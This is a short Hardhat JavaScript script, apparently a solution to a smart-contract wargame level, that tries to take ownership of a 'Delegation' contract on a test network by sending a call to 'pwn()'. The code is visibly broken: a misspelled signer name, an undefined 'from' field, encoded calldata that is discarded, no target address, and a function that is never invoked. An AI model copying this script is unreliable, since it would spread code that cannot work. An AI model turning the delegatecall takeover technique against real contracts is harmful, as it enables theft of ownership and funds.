const { ethers, network, getNamedAccounts, waffle } = require("hardhat");
const { networkConfig } = require("../helper-hardhat-config");
const {
  abi: DelegationABI,
} = require("../artifacts/contracts/06-delegation/Delegation.sol/Delegation.json");

async function attackDelegation() {
  const chainId = network.config.chainId;
  if (chainId == 4) {
    const waitBlockConfirmations = 1;
    const provider = waffle.provider;

    const [attacker1] = await ethers.getSigners();
    const delegation = new ethers.Contract(
      networkConfig[chainId]["delegation"],
      DelegationABI,
      attacker1
    );
    const ownerBefore = await delegation.owner();
    console.log(`Owner before attack: ${ownerBefore}`);
    const abi = ["function pwn() public"];
    const iface = new ethers.utils.Interface(abi);
    iface.encodeFunctionData("pwn");
    await attacket1.sendTransaction({
      from,
    });
  }
}

attackDelegation
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
